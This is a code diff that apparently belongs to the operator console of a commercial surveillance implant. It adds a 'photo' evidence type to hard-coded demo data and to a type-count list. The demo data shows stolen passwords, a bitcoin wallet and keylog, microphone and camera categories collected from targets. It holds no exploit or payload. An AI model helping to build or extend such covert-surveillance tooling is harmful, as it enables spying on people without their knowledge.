@@ -53,7 +53,9 @@ package it.ht.rcs.console.evidence.rest
       new Evidence({_id: 'e04', aid: 'a1', blo: false, da: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 14, 53, 54)), dr: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 14, 58, 42)), _mid: 0, note: '', rel: 0, type: 'password', data: new EvidenceData({user: 'jimmy.page', pass: 'beta456', program: 'Firefox/Thunderbird', service: 'https://twitter.com'})}),
 
       new Evidence({_id: 'e05', aid: 'a1', blo: false, da: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 14, 53, 54)), dr: convertToUnix(new Date(tenDaysAgo.fullYear, tenDaysAgo.month, tenDaysAgo.date, 14, 58, 42)), _mid: 0, note: '', rel: 0, type: 'password', data: new EvidenceData({user: 'root', pass: 'admin', program: 'Firefox/Thunderbird', service: 'http://172.16.42.100'})}),
-
+//photo
+      new Evidence({_id: 'e32', aid: 'a1', blo: false, da: convertToUnix(new Date(now.fullYear, now.month, now.date, 16, 29, 07)), dr: convertToUnix(new Date(now.fullYear, now.month, now.date, 16, 30, 06)), _mid: 0, note: '', rel: 0, type: 'photo', data: new EvidenceData({program: 'photo.exe', window: 'Jimmy Page - Photos', _grid: '50bcb444572d6e0d00000140.jpg'})}), 
+      
       
       //money
       new Evidence({_id: 'e96', aid: 'a1', blo: false, da: convertToUnix(new Date(now.fullYear, now.month, now.date, 14, 53, 59)), dr: convertToUnix(new Date(now.fullYear, now.month, now.date, 14, 58, 43)), _mid: 0, note: '', rel: 0, type: 'money', data: new EvidenceData({type: 'wallet', currency:'bitcoin',version:'80600', encrypted:false,size:'73728',balance:0})}),
@@ -671,12 +673,16 @@ package it.ht.rcs.console.evidence.rest
       var url:TypeCount = new TypeCount();
       url.type = "url";
       counts["url"] = url;
+      
+      var photo:TypeCount = new TypeCount();
+      photo.type = "photo";
+      counts["photo"] = photo;
 
       var total:TypeCount = new TypeCount();
       total.type = "total";
       counts["total"] = total;
 
-      result.source = [addressbook, application, calendar, call, camera, chat, clipboard, device, file, keylog, message, mic, money, mouse, password, position, print, screenshot, url, total];
+      result.source = [addressbook, application, calendar, call, camera, chat, clipboard, device, file, keylog, message, mic, money, mouse, password, photo, position, print, screenshot, url, total];
 
       var i:uint;
       var currentEvidence:Evidence;
